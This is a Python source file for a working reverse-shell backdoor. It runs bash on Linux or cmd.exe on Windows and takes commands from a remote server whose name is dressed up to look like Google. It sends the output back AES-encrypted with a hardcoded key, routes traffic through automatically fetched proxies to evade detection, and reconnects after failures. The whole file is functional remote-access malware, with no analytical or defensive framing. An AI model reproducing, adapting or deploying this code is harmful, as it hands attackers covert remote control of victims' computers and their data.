import os, select, threading, requests, time, uuid, hashlib, platform, subprocess
from Crypto.Cipher import AES
from swiftshadow import QuickProxy        # auto proxy finder

SERVER   = "https://google-event.adeeb.eu.org"
AUTH_KEY = b"DiscordTcpKonz"
CLIENT_ID = str(uuid.uuid4())[:8]
IS_WINDOWS = platform.system().lower().startswith("win")

# pick a proxy if available
try:
    proxy   = QuickProxy()
    PROXIES = proxy.as_requests_proxies()
    os.environ.update(HTTP_PROXY = PROXIES.get("http", ""),
                      HTTPS_PROXY = PROXIES.get("https", ""))
except Exception:
    PROXIES = None

def _derive(p): return hashlib.sha256(p).digest()
def _pad(b): m = 16 - len(b) % 16; return b + bytes([m])*m
def _unpad(b): return b[:-b[-1]]

def enc(raw: bytes, key=AUTH_KEY):
    iv = os.urandom(16)
    return iv + AES.new(_derive(key), AES.MODE_CBC, iv).encrypt(_pad(raw))

def dec(ct: bytes, key=AUTH_KEY):
    iv, data = ct[:16], ct[16:]
    return _unpad(AES.new(_derive(key), AES.MODE_CBC, iv).decrypt(data))

def auth_hdr():
    return {"X-CLIENT-AUTH": enc(CLIENT_ID.encode()).hex()}


# ---------- Linux ----------
def linux_shell():
    import pty
    while True:
        try:
            pid, fd = pty.fork()
            if pid == 0:                 # child
                os.execvp("bash", ["bash"])
            else:                        # parent
                threading.Thread(target=_stream_out_linux, args=(fd,), daemon=True).start()
                _read_cmds_linux(fd)
        except Exception:
            time.sleep(5)

def _stream_out_linux(fd):
    while True:
        try:
            r, _, _ = select.select([fd], [], [], 0.1)
            if fd in r:
                data = os.read(fd, 4096)
                if data:
                    requests.post(
                        f"{SERVER}/post_stream",
                        data=enc(data),
                        headers=auth_hdr(),
                        proxies=PROXIES,
                        timeout=5,
                    )
        except Exception:
            time.sleep(2)

def _read_cmds_linux(fd):
    while True:
        try:
            res = requests.get(f"{SERVER}/get_command",
                               headers=auth_hdr(), proxies=PROXIES, timeout=10)
            if res.ok and res.content:
                os.write(fd, dec(res.content))
        except Exception:
            time.sleep(2)
        time.sleep(0.5)


# ---------- Windows ----------
def windows_shell():
    while True:
        try:
            proc = subprocess.Popen(
                ["cmd.exe"], stdin=subprocess.PIPE,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                shell=True, bufsize=0
            )
            threading.Thread(target=_stream_out_win, args=(proc,), daemon=True).start()
            _read_cmds_win(proc)
        except Exception:
            time.sleep(5)

def _stream_out_win(proc):
    for line in iter(proc.stdout.readline, b""):
        try:
            requests.post(f"{SERVER}/post_stream",
                          data=enc(line),
                          headers=auth_hdr(),
                          proxies=PROXIES, timeout=5)
        except Exception:
            time.sleep(2)

def _read_cmds_win(proc):
    while True:
        try:
            res = requests.get(f"{SERVER}/get_command",
                               headers=auth_hdr(), proxies=PROXIES, timeout=10)
            if res.ok and res.content:
                proc.stdin.write(dec(res.content))
                proc.stdin.flush()
        except Exception:
            time.sleep(2)
        time.sleep(0.5)


def main():
    windows_shell() if IS_WINDOWS else linux_shell()


if __name__ == "__main__":
    main()
